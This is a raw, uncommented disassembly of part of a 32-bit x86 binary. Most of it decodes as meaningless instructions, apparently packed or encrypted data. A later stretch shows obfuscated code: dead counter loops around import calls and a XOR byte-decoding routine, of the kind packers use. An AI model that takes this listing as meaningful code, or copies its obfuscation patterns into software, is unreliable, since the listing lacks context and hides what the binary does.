  40fc31:	cwde   
  40fc32:	arpl   WORD PTR [esp+edi*8+0x60b1b583],si
  40fc39:	mov    WORD PTR [ecx],ds
  40fc3b:	push   esi
  40fc3c:	out    dx,eax
  40fc3d:	repz and eax,0x2a45a64c
  40fc43:	dec    eax
  40fc44:	mov    ebx,0xe79d9a39
  40fc49:	call   0x2d24b3ca
  40fc4e:	sbb    BYTE PTR [esi+0x761ff649],bh
  40fc54:	lods   eax,DWORD PTR ds:[esi]
  40fc55:	rcl    BYTE PTR ds:0x76512358,cl
  40fc5b:	sub    al,al
  40fc5d:	popa   
  40fc5e:	or     eax,0xf7ef2e0a
  40fc63:	shl    DWORD PTR [eax+ecx*1+0x98e417b],0xfb
  40fc6b:	fmul   st,st(0)
  40fc6d:	push   eax
  40fc6e:	adc    ebx,DWORD PTR [ecx-0xe]
  40fc71:	clc    
  40fc72:	out    dx,eax
  40fc73:	pop    ebp
  40fc74:	std    
  40fc75:	in     al,0x66
  40fc77:	mov    dl,0x43
  40fc79:	jecxz  0x40fcde
  40fc7b:	cwde   
  40fc7c:	call   0x4c2d2e60
  40fc81:	aas    
  40fc82:	mov    esi,0xe4ddb66d
  40fc87:	in     al,0x51
  40fc89:	pop    ss
  40fc8a:	sub    BYTE PTR ds:0xad753295,dl
  40fc90:	(bad)
  40fc93:	cmp    DWORD PTR [ecx],esp
  40fc95:	and    BYTE PTR ds:0xd9e0c9b6,bh
  40fc9b:	dec    edi
  40fc9c:	and    BYTE PTR ds:0x475faa92,dh
  40fca2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fca3:	in     eax,dx
  40fca4:	mov    dh,0xb8
  40fca6:	call   0xf098f0bd
  40fcab:	and    ecx,DWORD PTR ds:0xd8a51e0f
  40fcb1:	xor    ecx,0xffffffc5
  40fcb4:	jbe    0x40fc48
  40fcb6:	stc    
  40fcb7:	test   BYTE PTR [ebx+0x63],al
  40fcba:	mov    esp,0xb161a57d
  40fcbf:	xor    BYTE PTR [ebx],dl
  40fcc1:	aad    0x7f
  40fcc3:	pop    ss
  40fcc4:	and    dl,cl
  40fcc6:	sub    DWORD PTR [edx-0x5d1fa847],eax
  40fccc:	and    BYTE PTR [esi+0x24],al
  40fccf:	jmp    0x7b1cf9e9
  40fcd4:	sbb    esp,ecx
  40fcd6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fcd7:	mov    ch,0xd8
  40fcd9:	outs   dx,DWORD PTR ds:[esi]
  40fcda:	mov    al,0xd
  40fcdc:	jmp    0xe5:0xfadd47a
  40fce3:	pop    ebx
  40fce4:	mov    bl,0x34
  40fce6:	les    esi,FWORD PTR [eax]
  40fce8:	mov    ecx,0xd7afb1d1
  40fced:	push   ds
  40fcee:	and    eax,0xcae44096
  40fcf3:	aad    0x85
  40fcf5:	xor    DWORD PTR fs:[ecx+0x3b],esp
  40fcf9:	and    DWORD PTR [ebp+0x9b40c10],esi
  40fcff:	or     al,0xbe
  40fd01:	xor    ecx,edx
  40fd03:	xchg   edi,eax
  40fd04:	push   eax
  40fd05:	add    BYTE PTR [eax],al
  40fd07:	fild   QWORD PTR [eax+0x1c]
  40fd0a:	call   0x262cf8b
  40fd0f:	ror    DWORD PTR [ecx+0x2bb959c4],0x41
  40fd16:	(bad)  [edx]
  40fd18:	adc    al,cl
  40fd1a:	fucomip st,st(4)
  40fd1c:	cs das 
  40fd1e:	leave  
  40fd1f:	sub    al,0xae
  40fd21:	or     DWORD PTR [esi+0x7f],esi
  40fd24:	push   0x4
  40fd26:	dec    edi
  40fd27:	sahf   
  40fd28:	or     ebp,DWORD PTR [edx+esi*8-0x4c]
  40fd2c:	mul    BYTE PTR [esi+0x3e3e00fc]
  40fd32:	aam    0xa7
  40fd34:	mov    dh,0x4e
  40fd36:	adc    ebx,DWORD PTR [eax-0x5fed78]
  40fd3c:	pushf  
  40fd3d:	mov    dh,0xee
  40fd3f:	pandn  xmm7,XMMWORD PTR [ebp+0xb]
  40fd44:	(bad)  
  40fd45:	dec    ebp
  40fd46:	mov    cl,0x6d
  40fd48:	xchg   edx,eax
  40fd49:	jmp    0x1d29c07
  40fd4e:	add    al,0x8a
  40fd50:	ss cmp al,0x9d
  40fd53:	test   al,0x42
  40fd55:	jmp    0x7b42212f
  40fd5a:	mov    dl,0x79
  40fd5c:	gs scas eax,DWORD PTR es:[edi]
  40fd5e:	xchg   esp,eax
  40fd5f:	rol    DWORD PTR [ebx-0x66db4b9a],1
  40fd65:	addr16 out 0xd4,al
  40fd68:	jmp    0x58eb:0xaa55e3dd
  40fd6f:	fld    st(2)
  40fd71:	stos   BYTE PTR es:[edi],al
  40fd72:	pop    edx
  40fd73:	pop    ecx
  40fd74:	rcr    DWORD PTR [eax+0x55868785],1
  40fd7a:	rol    BYTE PTR [esi+0x65],1
  40fd7d:	sub    eax,0x2e93e2f0
  40fd82:	cs dec ebp
  40fd84:	jg     0x40fd4c
  40fd86:	dec    ebp
  40fd87:	adc    BYTE PTR [ecx],dh
  40fd89:	xchg   edx,eax
  40fd8a:	dec    edi
  40fd8b:	lea    edi,[ebx]
  40fd8d:	sahf   
  40fd8e:	loopne 0x40fd61
  40fd90:	xchg   edx,eax
  40fd91:	daa    
  40fd92:	push   cs
  40fd93:	cmp    eax,ecx
  40fd95:	pop    ss
  40fd96:	in     eax,0x30
  40fd98:	xor    al,0xb1
  40fd9a:	xor    DWORD PTR [ebp+0x30],ebx
  40fd9d:	ins    DWORD PTR es:[edi],dx
  40fd9e:	mov    esi,0xeae25a8d
  40fda3:	sub    DWORD PTR [ebp-0x36],esi
  40fda6:	sbb    al,0xd7
  40fda8:	lea    ebx,[esi]
  40fdaa:	xchg   edx,eax
  40fdab:	xchg   esi,eax
  40fdac:	xchg   ebp,eax
  40fdad:	dec    ecx
  40fdae:	sbb    esi,DWORD PTR [edi]
  40fdb0:	fiadd  DWORD PTR [ebx]
  40fdb2:	dec    edx
  40fdb3:	mov    ds:0x7e5be50b,eax
  40fdb8:	dec    esp
  40fdb9:	prefetch (bad)
  40fdba:	or     eax,0x9321a2ed
  40fdbf:	cmp    al,0x4b
  40fdc1:	push   ebx
  40fdc2:	inc    esi
  40fdc3:	outs   dx,BYTE PTR ds:[esi]
  40fdc4:	cld    
  40fdc5:	cwde   
  40fdc6:	(bad)  
  40fdc7:	scas   al,BYTE PTR es:[edi]
  40fdc8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fdc9:	xchg   BYTE PTR [ecx-0x3da25029],dl
  40fdcf:	push   esp
  40fdd0:	(bad)  
  40fdd1:	cmc    
  40fdd2:	fisub  WORD PTR [esi]
  40fdd4:	inc    ebx
  40fdd5:	mov    esp,0x29c4bdb3
  40fdda:	mov    dh,0x80
  40fddc:	add    DWORD PTR [edi+ecx*8-0x3a],edi
  40fde0:	xchg   esi,eax
  40fde1:	add    BYTE PTR [edx+0x4fc8e8be],bh
  40fde7:	adc    ah,BYTE PTR [ecx+0x1884b593]
  40fded:	jno    0x40fda9
  40fdef:	mov    al,ds:0x7adcaa5f
  40fdf4:	std    
  40fdf5:	ins    BYTE PTR es:[edi],dx
  40fdf6:	jecxz  0x40fe3a
  40fdf8:	mov    dh,ch
  40fdfa:	call   FWORD PTR [ecx-0x8]
  40fdfd:	neg    DWORD PTR [ebx+eiz*4-0x1506fb14]
  40fe04:	aaa    
  40fe05:	jp     0x40fe3e
  40fe07:	stos   DWORD PTR es:[edi],eax
  40fe08:	push   0xffffff9d
  40fe0a:	mov    edx,eax
  40fe0c:	clc    
  40fe0d:	push   eax
  40fe0e:	shr    edx,cl
  40fe10:	dec    ebx
  40fe11:	mov    eax,?
  40fe13:	into   
  40fe14:	js     0x40fdee
  40fe16:	mov    cs,WORD PTR [edi+0x6]
  40fe19:	sub    DWORD PTR [ecx+0x33],edx
  40fe1c:	xor    eax,0x94446a4d
  40fe21:	cmp    eax,0x8c06e962
  40fe26:	sub    BYTE PTR [eax+0x251ad075],dl
  40fe2c:	daa    
  40fe2d:	fmul   QWORD PTR [ecx]
  40fe2f:	call   0x3517:0xef7944fb
  40fe36:	les    edi,FWORD PTR [eax]
  40fe38:	pop    ebp
  40fe39:	out    0x12,eax
  40fe3b:	mov    ebx,0xb04649c8
  40fe40:	mov    cl,0xcd
  40fe42:	sub    ebx,ebp
  40fe44:	pop    ecx
  40fe45:	imul   eax,DWORD PTR [ecx-0x73ba2aa1],0x3c
  40fe4c:	int3   
  40fe4d:	adc    bl,BYTE PTR [eax+edi*2-0x5a509900]
  40fe54:	xor    ah,dl
  40fe56:	jl     0x40fe4f
  40fe58:	cwde   
  40fe59:	mov    esp,0x180e396d
  40fe5e:	jmp    0x9a7e:0x79b52f7f
  40fe65:	xor    cl,ah
  40fe67:	inc    ebx
  40fe68:	mov    al,0x75
  40fe6a:	retf   0x6f51
  40fe6d:	mov    ebx,0x59121f7f
  40fe72:	pop    es
  40fe73:	lahf   
  40fe74:	mov    dl,0x5f
  40fe76:	arpl   WORD PTR [ebx],si
  40fe78:	retf   
  40fe79:	cdq    
  40fe7a:	in     al,0x9d
  40fe7c:	sbb    eax,0x96362d5c
  40fe81:	mov    ds:0xdff83a3e,al
  40fe86:	mov    ebx,0x9faf5426
  40fe8b:	(bad)
  40fe8f:	xchg   esp,eax
  40fe90:	push   esi
  40fe91:	add    bh,BYTE PTR [ecx]
  40fe93:	and    BYTE PTR [eax],ch
  40fe95:	pop    eax
  40fe96:	jg     0x40fe9f
  40fe98:	push   cs
  40fe99:	enter  0x4620,0xf8
  40fe9d:	sub    BYTE PTR [ebp-0x74],bl
  40fea0:	add    BYTE PTR ds:0xa6396cc6,dh
  40fea6:	adc    BYTE PTR [eax],cl
  40fea8:	pop    esp
  40fea9:	js     0x40febf
  40feab:	or     BYTE PTR [ebx-0x12a0cca2],dh
  40feb1:	dec    edx
  40feb2:	outs   dx,BYTE PTR ds:[esi]
  40feb3:	xor    eax,0x8fed2c59
  40feb8:	xchg   esi,eax
  40feb9:	mov    ah,0xe3
  40febb:	mov    esp,0x8bfaf609
  40fec0:	xor    DWORD PTR [esi-0x5],ebp
  40fec3:	lods   al,BYTE PTR ds:[esi]
  40fec4:	dec    ebp
  40fec5:	ds push esp
  40fec7:	mov    esi,0x10e5b614
  40fecc:	loope  0x40fe87
  40fece:	loopne 0x40fead
  40fed0:	mov    esi,0x167e2d78
  40fed5:	inc    eax
  40fed6:	mov    eax,DWORD PTR [ebp+0xc]
  40fed9:	xor    edx,edx
  40fedb:	mov    ecx,0x7264fca9
  40fee0:	jmp    0x4101ff
  40fee5:	or     eax,0xf19cc125
  40feea:	pop    eax
  40feeb:	jno    0x40fea2
  40feed:	xchg   ecx,eax
  40feee:	add    eax,0x65124346
  40fef3:	std    
  40fef4:	mov    eax,0x7e7eb5de
  40fef9:	jl     0x40ff78
  40fefb:	jle    0x40ff7b
  40fefd:	lods   al,BYTE PTR ds:[esi]
  40fefe:	mov    edx,0x34000481
  40ff03:	mov    eax,ds:0x9d4a7e4c
  40ff08:	xchg   edi,eax
  40ff09:	(bad)  
  40ff0a:	pop    ss
  40ff0b:	ja     0x40fea8
  40ff0d:	sub    al,0x81
  40ff0f:	xchg   edx,eax
  40ff10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ff11:	leave  
  40ff12:	outs   dx,BYTE PTR ds:[esi]
  40ff13:	mov    ds:0x9c6d21b9,al
  40ff18:	mov    ebp,0xee6b3f6c
  40ff1d:	jle    0x40fef8
  40ff1f:	push   cs
  40ff20:	in     eax,0xf6
  40ff22:	fdivr  st(0),st
  40ff24:	stos   DWORD PTR es:[edi],eax
  40ff25:	(bad)  
  40ff26:	(bad)  
  40ff27:	int3   
  40ff28:	out    0x24,eax
  40ff2a:	xor    esp,DWORD PTR [eax-0x31c7200c]
  40ff30:	lods   eax,DWORD PTR ds:[esi]
  40ff31:	ss fwait
  40ff33:	cmp    eax,0x43d79d93
  40ff38:	dec    edi
  40ff39:	cwde   
  40ff3a:	sti    
  40ff3b:	ins    BYTE PTR es:[edi],dx
  40ff3c:	inc    eax
  40ff3d:	jae    0x40ffb7
  40ff3f:	xchg   BYTE PTR [eax+esi*1],ah
  40ff42:	shr    ebx,1
  40ff44:	sbb    BYTE PTR [ecx+edi*4],0xd5
  40ff48:	or     al,0xf5
  40ff4a:	loopne 0x40ff00
  40ff4c:	cwde   
  40ff4d:	call   0xa8f6:0x703f6d5a
  40ff54:	enter  0x332c,0x23
  40ff58:	je     0x40ffd4
  40ff5a:	and    BYTE PTR [edx+eiz*2+0x6f6272de],dl
  40ff61:	call   0x5e839d3e
  40ff66:	test   al,bl
  40ff68:	xchg   esi,eax
  40ff69:	popa   
  40ff6a:	add    esp,DWORD PTR [ecx-0x68]
  40ff6d:	sub    al,0xc0
  40ff6f:	(bad)  
  40ff70:	sbb    ch,dh
  40ff72:	mov    BYTE PTR [ebx+0x432e712b],dh
  40ff78:	ror    BYTE PTR [ebx+0x2d],1
  40ff7b:	mov    eax,es
  40ff7d:	mov    BYTE PTR [ebp+0x1b],dh
  40ff80:	add    bh,bl
  40ff82:	aad    0x67
  40ff84:	xchg   DWORD PTR [edi],edi
  40ff86:	out    0x48,eax
  40ff88:	pop    ebp
  40ff89:	test   DWORD PTR [ebp-0x16],0xa7d87688
  40ff90:	mov    ds:0xdc1fa603,eax
  40ff95:	sub    BYTE PTR [eax+0x52da9a9],0x11
  40ff9c:	mov    ?,WORD PTR [ebp+0x3bef62ce]
  40ffa2:	adc    BYTE PTR [esi+edx*1-0x6c],0xd7
  40ffa7:	sbb    DWORD PTR [ecx],eax
  40ffa9:	jge    0x40ff77
  40ffab:	fs push edx
  40ffad:	mov    WORD PTR [ecx],ss
  40ffaf:	cdq    
  40ffb0:	lods   al,BYTE PTR ds:[esi]
  40ffb1:	and    al,0xe4
  40ffb3:	mov    ebp,0x994cd279
  40ffb8:	inc    ebp
  40ffb9:	mov    al,0x17
  40ffbb:	scas   al,BYTE PTR es:[edi]
  40ffbc:	es add eax,0x9e40f022
  40ffc2:	or     DWORD PTR es:[edi],ecx
  40ffc5:	and    al,0x8
  40ffc7:	add    BYTE PTR [edx],al
  40ffc9:	lods   eax,DWORD PTR ds:[esi]
  40ffca:	mov    bh,BYTE PTR es:[edi+0x7e]
  40ffce:	mov    cl,al
  40ffd0:	mov    ebp,0x4cb00311
  40ffd5:	lods   al,BYTE PTR ds:[esi]
  40ffd6:	jns    0x40ffcd
  40ffd8:	icebp  
  40ffd9:	or     eax,0x608fb787
  40ffde:	or     ebx,edx
  40ffe0:	call   0x9e:0xf374b3a1
  40ffe7:	retf   
  40ffe8:	add    ah,BYTE PTR ds:0x85e7bf9f
  40ffee:	lea    ebp,[eax+edx*8+0x35728e65]
  40fff5:	inc    ebp
  40fff6:	popf   
  40fff7:	loopne 0x40ff8a
  40fff9:	cmp    ecx,DWORD PTR [ecx+edi*8]
  40fffc:	jecxz  0x410054
  40fffe:	cld    
  40ffff:	rcl    BYTE PTR [ebx+0x7fd7a0ca],1
  410005:	jl     0x40ffac
  410007:	or     BYTE PTR ds:0x7db0f21e,bh
  41000d:	jbe    0x41006a
  41000f:	mov    ecx,0x1c28f2c1
  410014:	stos   BYTE PTR es:[edi],al
  410015:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410016:	(bad)  
  410018:	mov    ds:0xd0d65c7e,eax
  41001d:	in     eax,dx
  41001e:	ficomp DWORD PTR [ebx-0x1d6d9c6f]
  410024:	adc    BYTE PTR [esi+0x76],bh
  410027:	mov    edi,0x6de9ded1
  41002c:	in     al,dx
  41002d:	fsubr  DWORD PTR [ecx+0x45ebe593]
  410033:	lods   eax,DWORD PTR ds:[esi]
  410034:	mov    dh,0x15
  410036:	xor    BYTE PTR [ebp-0x66],dl
  410039:	(bad)  
  41003a:	retf   0xc95a
  41003d:	add    eax,DWORD PTR [ebp+0x6c]
  410040:	pop    ds
  410041:	sub    eax,0xd62cce2e
  410046:	mov    bh,0x71
  410048:	sar    BYTE PTR [edi+0x6],cl
  41004b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41004c:	cld    
  41004d:	jns    0x4100c4
  41004f:	mov    dl,BYTE PTR [esi-0x46]
  410052:	mov    cl,BYTE PTR [edx-0xdc6b6a0]
  410058:	jmp    0xd007:0x58a8961a
  41005f:	mov    cl,0x93
  410061:	fisttp DWORD PTR [ebx]
  410063:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410064:	(bad)  
  410065:	out    dx,al
  410066:	sub    esi,edi
  410068:	xchg   edi,eax
  410069:	jecxz  0x410021
  41006b:	or     eax,0x5a24f0bc
  410070:	(bad)  
  410071:	ins    BYTE PTR es:[edi],dx
  410072:	lds    edi,FWORD PTR [ebp-0x27ff148]
  410078:	jg     0x4100ed
  41007a:	mov    WORD PTR [edi-0x6208a8c8],cs
  410080:	pop    es
  410081:	sub    al,0xa5
  410083:	add    edx,esp
  410085:	outs   dx,BYTE PTR ds:[esi]
  410086:	xchg   ebp,eax
  410087:	data16 sahf 
  410089:	sbb    eax,0x43c6a2a4
  41008e:	push   0x6ec60f21
  410093:	into   
  410094:	pop    es
  410095:	xchg   edx,eax
  410096:	cmp    BYTE PTR ds:0x42d785fe,0xa8
  41009d:	mov    gs,WORD PTR [ecx]
  41009f:	mov    edx,0x872113b9
  4100a4:	(bad)  
  4100a5:	lods   al,BYTE PTR ds:[esi]
  4100a6:	cdq    
  4100a7:	je     0x4100c0
  4100a9:	xor    ebp,0xb
  4100ac:	cmp    edi,DWORD PTR [ebp-0x62]
  4100af:	cmc    
  4100b0:	xchg   BYTE PTR [ebp-0x75ca6ee6],ch
  4100b6:	out    dx,eax
  4100b7:	test   cl,dl
  4100b9:	jge    0x410138
  4100bb:	mov    dh,0x77
  4100bd:	rol    BYTE PTR [esi+edi*1],1
  4100c0:	mov    bh,0x51
  4100c2:	xchg   edi,eax
  4100c3:	(bad)  
  4100c4:	loope  0x4100e5
  4100c6:	shr    DWORD PTR [edx+ebx*4],0xf3
  4100ca:	popa   
  4100cb:	xchg   esi,eax
  4100cc:	pop    eax
  4100cd:	push   ss
  4100ce:	inc    esi
  4100cf:	xor    al,0xf4
  4100d1:	push   ds
  4100d2:	mov    cl,0xb8
  4100d4:	cli    
  4100d5:	push   cs
  4100d6:	xlat   BYTE PTR ds:[ebx]
  4100d7:	push   ebx
  4100d8:	mov    eax,ds:0xd62a685c
  4100dd:	pop    es
  4100de:	cmc    
  4100df:	jmp    0x4100ed
  4100e1:	sub    DWORD PTR [ecx+0x1ae63ac6],ebp
  4100e7:	adc    al,BYTE PTR [ebp-0x4be31cf1]
  4100ed:	xchg   BYTE PTR [eax],ah
  4100ef:	pop    eax
  4100f0:	dec    edi
  4100f1:	jae    0x4100d5
  4100f3:	test   DWORD PTR [edx],ebx
  4100f5:	into   
  4100f6:	pop    ds
  4100f7:	arpl   WORD PTR [esi-0x2073349f],si
  4100fd:	jb     0x410115
  4100ff:	outs   dx,BYTE PTR ds:[esi]
  410100:	lea    esi,[eax]
  410102:	clc    
  410103:	(bad)  
  410104:	sbb    bh,BYTE PTR [ebx+0x75de0fb2]
  41010a:	int3   
  41010b:	aas    
  41010c:	adc    eax,0xa8dfff25
  410111:	mov    esi,0x2d98ec12
  410116:	stos   DWORD PTR es:[edi],eax
  410117:	pop    ds
  410118:	pop    esi
  410119:	adc    DWORD PTR [ebx+esi*4-0x36],0x68
  41011e:	and    DWORD PTR [esi+0x8086b47],edx
  410124:	push   cs
  410125:	pop    esp
  410126:	icebp  
  410127:	(bad)  
  410129:	cmp    ebp,DWORD PTR [edx+eiz*8]
  41012c:	daa    
  41012d:	mov    ebp,0x228335b6
  410132:	and    ah,al
  410134:	and    DWORD PTR [ebx],ecx
  410136:	and    DWORD PTR ds:0xea7fbf1a,ebp
  41013c:	ins    DWORD PTR es:[edi],dx
  41013d:	call   esp
  41013f:	test   BYTE PTR [eax+0x25],dl
  410142:	xchg   ecx,eax
  410143:	jg     0x410161
  410145:	pop    es
  410146:	adc    ah,BYTE PTR [ecx+0x1096ccb9]
  41014c:	jmp    0xe682e506
  410151:	add    BYTE PTR [edi],cl
  410153:	cmc    
  410154:	mov    ebp,0xee014daa
  410159:	mov    ecx,0xd6a3ddff
  41015e:	mov    eax,ds:0x1fbe07a1
  410163:	inc    edx
  410164:	push   0xe3272bb6
  410169:	push   esi
  41016a:	dec    ebp
  41016b:	retf   0x4f
  41016e:	jne    0x4101a0
  410170:	sub    BYTE PTR [ebx],dh
  410172:	pop    edx
  410173:	xchg   ecx,eax
  410174:	xor    eax,0xd7d5cedf
  410179:	stos   BYTE PTR es:[edi],al
  41017a:	sub    ebp,DWORD PTR [ecx-0x68]
  41017d:	lods   eax,DWORD PTR ds:[esi]
  41017e:	lahf   
  41017f:	pop    edx
  410180:	xor    edi,DWORD PTR [edx]
  410182:	mov    cl,0x1f
  410184:	mov    esp,0xa7101c12
  410189:	push   ss
  41018a:	dec    esi
  41018b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41018c:	mov    esi,0x85c866d
  410191:	fwait
  410192:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410193:	jp     0x4101db
  410195:	adc    eax,DWORD PTR [esi+0x6f20b41c]
  41019b:	push   ebx
  41019c:	or     BYTE PTR [ebp+eiz*1+0x7120af29],al
  4101a3:	adc    eax,0x4c7c2e9d
  4101a8:	in     eax,0x53
  4101aa:	cmp    edi,DWORD PTR [eax-0x17]
  4101ad:	xchg   ebx,eax
  4101ae:	mov    ds:0xad53ce02,eax
  4101b3:	or     eax,0x3076905d
  4101b8:	xchg   BYTE PTR [eax+eiz*2-0x39],ch
  4101bc:	or     al,0xa8
  4101be:	es push esp
  4101c0:	cdq    
  4101c1:	inc    esp
  4101c2:	mov    esp,0x6ca4690
  4101c7:	inc    edi
  4101c8:	shl    ecx,1
  4101ca:	out    dx,al
  4101cb:	mov    BYTE PTR [esi+0x1b],bh
  4101ce:	jmp    0x4101d2
  4101d0:	cmc    
  4101d1:	sti    
  4101d2:	stos   BYTE PTR es:[edi],al
  4101d3:	dec    edi
  4101d4:	fistp  QWORD PTR [eax+0x7b]
  4101d7:	xor    BYTE PTR [ecx+0x480d8cb3],al
  4101dd:	mov    WORD PTR [ebx+0x51d1cf20],ds
  4101e3:	jge    0x4101b9
  4101e5:	clc    
  4101e6:	(bad)  
  4101e7:	xor    eax,DWORD PTR [edx+edx*8+0x7c5300e5]
  4101ee:	inc    esi
  4101ef:	stos   BYTE PTR es:[edi],al
  4101f0:	cdq    
  4101f1:	inc    eax
  4101f2:	inc    ebp
  4101f3:	mov    edi,0x21ebcb80
  4101f8:	cs loop 0x410268
  4101fb:	or     ah,BYTE PTR [esi-0x72]
  4101fe:	cs div ecx
  410201:	mov    ecx,DWORD PTR [ebp+0x10]
  410204:	and    ecx,eax
  410206:	or     ecx,0x81161d8f
  41020c:	mov    eax,ecx
  41020e:	pop    ebp
  41020f:	ret    0x18
  410212:	push   ebp
  410213:	mov    ebp,esp
  410215:	sub    esp,0x58
  410218:	mov    ecx,DWORD PTR ds:0x43379f
  41021e:	adc    DWORD PTR ds:0x4337d7,ecx
  410224:	mov    ecx,DWORD PTR [ebp+0x8]
  410227:	and    eax,0x4408
  41022c:	mov    eax,0x8a3c
  410231:	xor    ax,WORD PTR [ecx+0x20]
  410235:	sub    ecx,0x2534
  41023b:	mov    ecx,0x3b02
  410240:	or     DWORD PTR ds:0x43370b,0x3241
  41024a:	add    ax,cx
  41024d:	xor    DWORD PTR ds:0x43382b,0x1afb
  410257:	movzx  eax,ax
  41025a:	and    ecx,0x4b4d
  410260:	mov    DWORD PTR [ebp-0xc],eax
  410263:	xor    ecx,ecx
  410265:	xor    ecx,DWORD PTR ds:0x4337df
  41026b:	or     DWORD PTR ds:0x4337d7,ecx
  410271:	mov    BYTE PTR [ebp-0x1],0x7f
  410275:	and    DWORD PTR ds:0x4337ab,0x0
  41027f:	jmp    0x410291
  410284:	mov    ecx,DWORD PTR ds:0x4337ab
  41028a:	inc    ecx
  41028b:	mov    DWORD PTR ds:0x4337ab,ecx
  410291:	cmp    DWORD PTR ds:0x4337ab,0x14
  410298:	jae    0x4102ed
  41029e:	cmp    DWORD PTR ds:0x4337ab,0xb
  4102a5:	jne    0x4102c6
  4102ab:	push   DWORD PTR [ebp-0x28]
  4102ae:	push   0x4636
  4102b3:	push   0x8d9e
  4102b8:	push   0x8baf
  4102bd:	push   DWORD PTR [ebp-0x18]
  4102c0:	call   DWORD PTR ds:0x412374
  4102c6:	cmp    DWORD PTR ds:0x4337ab,0xa
  4102cd:	jne    0x4102e2
  4102d3:	xor    ecx,ecx
  4102d5:	add    ecx,DWORD PTR ds:0x4337ab
  4102db:	inc    ecx
  4102dc:	mov    DWORD PTR ds:0x4337ab,ecx
  4102e2:	jmp    0x410284
  4102e7:	sbb    ecx,DWORD PTR ds:0x433703
  4102ed:	lea    eax,[ebp-0x1]
  4102f0:	mov    DWORD PTR [ebp-0x10],eax
  4102f3:	mov    al,BYTE PTR [ebp-0x1]
  4102f6:	mov    ecx,DWORD PTR [ebp-0x10]
  4102f9:	sub    DWORD PTR ds:0x4337e7,0x43379f
  410303:	xor    al,0x46
  410305:	xor    DWORD PTR ds:0x4337e3,0x433797
  41030f:	sub    al,0x38
  410311:	mov    BYTE PTR [ecx],al
  410313:	movzx  ecx,WORD PTR ds:0x433757
  41031a:	sub    DWORD PTR ds:0x43371f,ecx
  410320:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  410327:	mov    DWORD PTR [ebp-0x10],0xf89c8532
  41032e:	and    DWORD PTR ds:0x43375b,0x0
  410338:	mov    ecx,DWORD PTR ds:0x43375b
  41033e:	inc    ecx
  41033f:	mov    DWORD PTR ds:0x43375b,ecx
  410345:	cmp    DWORD PTR ds:0x43375b,0x25
  41034c:	jne    0x410362
  410352:	push   0x4338af
  410357:	push   0x4338ef
  41035c:	call   DWORD PTR ds:0x4120f4
  410362:	cmp    DWORD PTR ds:0x43375b,0x16
  410369:	jb     0x410338
  41036f:	adc    DWORD PTR ds:0x43379f,edx
  410375:	mov    eax,DWORD PTR [ebp-0x8]
  410378:	and    DWORD PTR ds:0x433813,0x0
  410382:	mov    ecx,DWORD PTR ds:0x433813
  410388:	inc    ecx
  410389:	mov    DWORD PTR ds:0x433813,ecx
  41038f:	cmp    DWORD PTR ds:0x433813,0xf
  410396:	jne    0x4103ac
  41039c:	push   0x4337e7
  4103a1:	push   0x178b
  4103a6:	call   DWORD PTR ds:0x412378
  4103ac:	cmp    DWORD PTR ds:0x433813,0xe
  4103b3:	jne    0x4103c8
  4103b9:	xor    ecx,ecx
  4103bb:	xor    ecx,DWORD PTR ds:0x433813
  4103c1:	inc    ecx
  4103c2:	mov    DWORD PTR ds:0x433813,ecx
  4103c8:	cmp    DWORD PTR ds:0x433813,0x1b
  4103cf:	jb     0x410382
  4103d5:	sub    DWORD PTR ds:0x43375f,edx
  4103db:	mov    ecx,0x7510854
  4103e0:	push   esi
  4103e1:	and    DWORD PTR ds:0x433757,0x0
  4103eb:	jmp    0x4103ff
  4103f0:	xor    esi,esi
  4103f2:	add    esi,DWORD PTR ds:0x433757
  4103f8:	inc    esi
  4103f9:	mov    DWORD PTR ds:0x433757,esi
  4103ff:	cmp    DWORD PTR ds:0x433757,0x1d
  410406:	jae    0x410427
  41040c:	cmp    DWORD PTR ds:0x433757,0x26
  410413:	jne    0x410422
  410419:	push   DWORD PTR [ebp-0x24]
  41041c:	call   DWORD PTR ds:0x4122b4
  410422:	jmp    0x4103f0
  410427:	xor    eax,ecx
  410429:	mov    esi,0x32729b
  41042e:	add    eax,esi
  410430:	jmp    0x41043d
  410435:	mov    dl,BYTE PTR [ebp-0x1]
  410438:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  41043c:	inc    eax
  41043d:	cmp    eax,0x40
  410440:	jb     0x410435
  410446:	mov    edx,DWORD PTR [ebp-0x8]
  410449:	mov    eax,DWORD PTR [ebp-0xc]
  41044c:	xor    edx,ecx
  41044e:	add    edx,esi
  410450:	cmp    edx,eax
  410452:	je     0x410766
  410458:	push   ebx
  410459:	push   edi
  41045a:	mov    edi,DWORD PTR [ebp+0x8]
  41045d:	mov    eax,0x8a3c
  410462:	xor    ax,WORD PTR [edi+edx*4+0x2]
  410467:	mov    edi,0x3b02
  41046c:	add    ax,di
  41046f:	movzx  eax,ax
  410472:	mov    DWORD PTR [ebp-0x14],eax
  410475:	mov    eax,DWORD PTR [ebp+0x8]
  410478:	movzx  eax,WORD PTR [eax+edx*4]
  41047c:	xor    eax,0x8a3c
  410481:	add    eax,edi
  410483:	mov    edi,DWORD PTR [ebp-0x14]
  410486:	mov    BYTE PTR [ebp+edi*1-0x58],al
  41048a:	jmp    0x410758
  41048f:	cdq    
  410490:	outs   dx,BYTE PTR ds:[esi]
  410491:	mov    ds:0xa1f17118,eax
  410496:	outs   dx,DWORD PTR ds:[esi]
  410497:	or     BYTE PTR [edx],bl
  410499:	push   es
  41049a:	out    0xf8,al
  41049c:	sub    al,0x50
  41049e:	das    
  41049f:	fdiv   QWORD PTR [eax+0x7caf7e7e]
  4104a5:	jle    0x410525
  4104a7:	stc    
  4104a8:	push   edi
  4104a9:	js     0x41050b
  4104ab:	jge    0x4104eb
  4104ad:	jbe    0x410481
  4104af:	mov    edi,DWORD PTR [ecx+ebx*4]
  4104b2:	inc    edx
  4104b3:	(bad)  
  4104b4:	mov    eax,ds:0xa4d962cf
  4104b9:	pop    edx
  4104ba:	(bad)
  4104bd:	imul   ebx,esi,0xfffffff6
  4104c0:	mov    eax,0xe384570
  4104c5:	aaa    
